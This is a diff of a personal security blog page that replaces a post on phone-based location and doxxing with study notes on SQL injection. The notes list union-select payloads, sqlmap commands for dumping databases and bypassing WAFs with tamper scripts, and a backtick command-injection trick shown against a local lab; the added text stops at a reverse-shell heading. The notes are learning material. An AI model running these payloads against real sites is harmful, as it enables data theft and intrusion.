@@ -5,14 +5,14 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="他信了，他真的信了">
-    <meta name="description" content="头部声明：如果您是来学怎么定位他人的，不好意思，这是违法行为，我不会，也不会教。
-以下是废话
+    <meta name="description" content="SQL注入笔记——Edit by Hong_zhong1、最简单的联合注入
+首先判断闭合类型
 
- 事情是这样的
-今天凌晨，班级群里突然炸了。
-虽然我不咋看这群，但因为在我小号里就没设免打扰。
-我一看，好家伙，人口失踪（不是
-某位同学的一个外">
+数字型闭合：id=1时的结果与id=2-1时的结果一致
+字符型闭合：id=1时和id=1a时一致，再去深入判断具体类型
+
+判断字段数
+?id=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -508,7 +508,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    795
                 </div>
                 
 
@@ -535,68 +535,60 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>头部声明：如果您是来学怎么定位他人的，不好意思，这是违法行为，我不会，也不会教。</strong></p>
-<p>以下是废话</p>
-<blockquote>
-<p> 事情是这样的</p>
-<p>今天凌晨，班级群里突然炸了。</p>
-<p>虽然我不咋看这群，但因为在我小号里就没设免打扰。</p>
-<p>我一看，好家伙，人口失踪（不是</p>
-<p>某位同学的一个外地朋友已经失联一天，在群里问该咋办。</p>
-<p>秉承着人道主义的关怀<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7c9dcfb27d624535871d0c23a37589b2~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p>我要了手机号，看看能不能查出来点什么。</p>
-</blockquote>
-<h2 id="简单在网上搜搜"><a href="#简单在网上搜搜" class="headerlink" title="简单在网上搜搜"></a>简单在网上搜搜</h2><p>我在网上查了一下，如果搜索“通过手机号查询他人位置”</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/25789ad0185a4f1b88d2c0348e24ead2~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p> woc,居然有，那进去看看，一定要装一波<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eef2c21d75ac44e1b9f5140c7e4525c3~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p> <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41237e96691d445ea37706f9f109445d~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p> 看到这我就蚌埠住了</p>
-<p>“尝试注入防御网”</p>
-<p>不了解注入的可以看看我之前的文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55400802/article/details/127458779?spm=1001.2014.3001.5501" title="今年十八，喜欢SQL注入_迷雾安全-红中的博客-CSDN博客">今年十八，喜欢SQL注入_迷雾安全-红中的博客-CSDN博客</a></p>
-<p>注入防御网。。。我只能说nb</p>
-<p>同时科普一下：（软考要背的</p>
-<p>刑法第二百八十五条：</p>
-<p><strong>侵入国家事务，国防建设，尖端科学技术领域的计算机信息系统的，处三年以下（）</strong></p>
-<p>所以说，看到这篇文章的哥们姐们，不要信可以通过手机号即可定位一个人，这在不违法的前提下是假的。</p>
-<p>那为什么在某些电视剧里，可以通过手机定位呢？</p>
-<p>接下来讲讲技术实现</p>
-<h2 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h2><p>从技术层面上来讲，其实是可以通过手机号定位的</p>
-<p>具体通过GPS、卫星系统与基站</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9da323c0f20f45b59c045405ed39653b~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p>普遍情况下</p>
-<p><strong>GPS：</strong></p>
-<p>只要你还在地球表面，就随时会有六颗卫星在你头顶上转悠。</p>
-<p><strong>卫星系统：</strong> <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d3592addd13449ed91be1960395b18f4~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p> 卫星定位系统的地面客户端本质上是无源设备，即不向外发射信号。</p>
-<p>仅通过接收卫星信号就可以确定自己的位置。</p>
-<p>而卫星不断发出的信号实际上是自己在太空中的位置信息，再通过用信号传输速度乘以卫星与地面之间的传输时间，就可以得出卫星与客户端之间的距离。</p>
-<p>也就是说，客户端从卫星那里获得了两个原始数据：卫星的位置，以及卫星距离自己的距离。</p>
-<p>接下来需要</p>
-<p>极其复杂<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0bc5d0cda47e4f20a184ac2fd5fc3a25~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p>的数学运算 </p>
-<p><strong>基站定位：</strong></p>
-<p>基站定位顾名思义是就是配合地面信息通讯基站系统来实现的定位。</p>
-<p>根据信号发出返回的时间差，再配合基站的地理位置，利用三个基站同时测量就可以准确的测量出个人所在的位置。</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e6ebbf6af17d4d2caa065419f6c1f5da~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p> 而现在常用的定位方式即为A-GPS</p>
-<blockquote>
-<p>A-GPS（Assisted GPS）即辅助GPS技术，它可以提高 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/GPS/214654?fromModule=lemma_inlink" title="GPS">GPS</a> 卫星定位系统的性能。通过移动通信运营基站它可以快速地定位，广泛用于含有GPS功能的手机上。GPS通过卫星发出的无线电信号来进行定位。当在很差的信号条件下，例如在一座城市，这些信号可能会被许多不规则的建筑物、墙壁或树木削弱。在这样的条件下，非A-GPS 导航设备可能无法快速定位，而A-GPS 系统可以通过运营商基站信息来进行快速定位。——百度百科</p>
-</blockquote>
-<p>说原理可能比较晦涩，直接看图</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/89b98f0528f849f68b5492b3b3d39151~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p>但是这几种定位方式，数据都是在国家手中保存的，就算是公安系统，也许要向上级请示才能够定位。</p>
-<p>未经授权的行为是违法的！</p>
-<h2 id="接着聊废话"><a href="#接着聊废话" class="headerlink" title="接着聊废话"></a>接着聊废话</h2><p>接着说回来，那边可能是人口失踪，刻不容缓<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a62dd2959d174a8bb99b68c7342d46c3~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p> 所以我找了一位在警局工作的朋友求他托关系帮我问问怎么搞。</p>
-<p>结果发现这手机关机了。。。</p>
-<p>那从信息安全的角度来说行不通，我看看社工可不可以。</p>
-<h2 id="简单聊聊社工"><a href="#简单聊聊社工" class="headerlink" title="简单聊聊社工"></a>简单聊聊社工</h2><p>最近社工的事件很火，今年阿里信息库泄露，还有更早的一个某公司数据泄露导致现如今大家的信息早已不是秘密。</p>
-<p>在电报上，有很多的社工机器人，只要你有对方的手机/QQ/微信等账号，即可爆出对方的姓名，住址，身份信息，学院等等等等</p>
-<p>这也俗称为“开盒”</p>
-<p>是一种恶劣且严重的违法行为</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e75b19a980a14c0783432f69387d3990~tplv-k3u1fbpfcp-zoom-1.image"></p>
-<p>最后呢，希望能够尽早联系上失联的哥们。</p>
-
+                <h3 id="SQL注入笔记——Edit-by-Hong-zhong"><a href="#SQL注入笔记——Edit-by-Hong-zhong" class="headerlink" title="SQL注入笔记——Edit by Hong_zhong"></a>SQL注入笔记——Edit by Hong_zhong</h3><p>1、最简单的联合注入</p>
+<p>首先判断闭合类型</p>
+<ul>
+<li>数字型闭合：id=1时的结果与id=2-1时的结果一致</li>
+<li>字符型闭合：id=1时和id=1a时一致，再去深入判断具体类型</li>
+</ul>
+<p>判断字段数</p>
+<p>?id=1’ order by 1</p>
+<p>?id=1’ order by 2</p>
+<p>…….</p>
+<p>直至报错或者无回显</p>
+<p>爆库名</p>
+<p>id=-1’ union select 1,2,database() –+</p>
+<p>select后面的1,2,3……根据字段数适当改变</p>
+<p>必背</p>
+<p>爆表名</p>
+<p>group_concat(table_name)联合查询表名</p>
+<p>information_schema.tables数据库中对应的表</p>
+<p>table_schema表的上层数据库</p>
+<p>爆字段名</p>
+<p>group_concat(column_name)联合查询字段名</p>
+<p>information_schema.columns数据库中对应的表</p>
+<p>table_name=想查询的表</p>
+<p>kobe’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</p>
+<p>xssblind</p>
+<h2 id="Sqlmap笔记——Edit-by-Hong-zhong"><a href="#Sqlmap笔记——Edit-by-Hong-zhong" class="headerlink" title="Sqlmap笔记——Edit by Hong_zhong"></a>Sqlmap笔记——Edit by Hong_zhong</h2><h4 id="Sqlmap简介："><a href="#Sqlmap简介：" class="headerlink" title="Sqlmap简介："></a>Sqlmap简介：</h4><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
+<p>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</p>
+<h4 id="Sqlmap使用："><a href="#Sqlmap使用：" class="headerlink" title="Sqlmap使用："></a>Sqlmap使用：</h4><h6 id="最基础的Sqlmap的使用如下"><a href="#最基础的Sqlmap的使用如下" class="headerlink" title="最基础的Sqlmap的使用如下:"></a>最基础的Sqlmap的使用如下:</h6><p><code>sqlmap.py -u "url" --dbs --batch</code>  爆库</p>
+<p><code>sqlmap.py -u "url -D 库名 --tables --batch</code>  爆表</p>
+<p>–后一般接单词/缩写                                              -后一般接字母</p>
+<p>-u+url                       -r+抓包文件</p>
+<p>-D后接库名，-T后接表名，-C后接字段名</p>
+<p>爆出字段名之后使用<em>dump</em>列出某字段的具体数据</p>
+<h6 id="统一使用："><a href="#统一使用：" class="headerlink" title="统一使用："></a>统一使用：</h6><p>cookie注入：<code>sqlmap.py -u 注入点 --cookie "参数" --tables --level 2</code></p>
+<p>POST登录框注入：<code>sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables</code></p>
+<p>如果觉得保存到文本中再去跑SQL注入比较麻烦，那么sqlmap还集成了谷歌的搜索模块，即提供了google搜索引擎的搜索</p>
+<p>使用方式为 -g 搜索表达式，</p>
+<p>sqlmap -g 搜索语句就可以直接调用Google引擎进行批量化扫描</p>
+<p> <code>sqlmap.py -u 登录的地址 --forms </code>自动判断注入</p>
+<p> <code>sqlmap.py -u 登录的地址 --data</code> “指定参数”</p>
+<p>绕过waf防火墙：<code>sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py</code></p>
+<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/afdf7f51a6d74bc08bf7bb4d2ea6896c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
+<h4 id="如何反制Sqlmap（图一乐"><a href="#如何反制Sqlmap（图一乐" class="headerlink" title="如何反制Sqlmap（图一乐"></a>如何反制Sqlmap（图一乐</h4><p>在前面的sqlmap简介中已经提到，sqlmap是一款自动化工具，而最经典的sqlmap使用在命令行中</p>
+<p>这就造成了安全隐患，而这个安全隐患并非sqlmap独占，而是所有命令行工具都有可能面临的威胁</p>
+<h6 id="bash命令"><a href="#bash命令" class="headerlink" title="bash命令"></a>bash命令</h6><p>先来介绍下bash命令</p>
+<p>在bash命令中，某些字符在””中可能会有特殊的含义，例如   <strong>`</strong></p>
+<p>被反引号包裹在其中的字符会被当做系统命令来执行</p>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e8ced69e21c448998fc2dd3d3bc3fb62~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
+<p>那么在sqlmap中也可以这样搞，先用docker拉一个pikachu来</p>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c8364a2dbcb4491eaafd0ac57dc23fb0~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
+<p>执行<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/vul/sqli/sqli_str.php/%60ls%60">http://127.0.0.1:8000/vul/sqli/sqli_str.php\`ls`</a>“</p>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c87c4710d7814d27973de7fcc93bc35c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
+<p>在执行sqlmap检测的时候列出了自己当前系统的文件</p>
+<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6>
                 
             </div>
             <hr/>
@@ -740,32 +732,40 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/0.html">
+                <a href="/posts/7672.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="2022总结：我是怎样从一个混子到如今小有所成">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">2022总结：我是怎样从一个混子到如今小有所成</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            如果硬要问我是在什么时候入门的，那就要说到高一下学期我开始学习Python
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-15
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-16
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Hong_zhong
+                            Hong_Zhong
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">总结</span>
+                    </a>
+                    
                 </div>
                 
             </div>
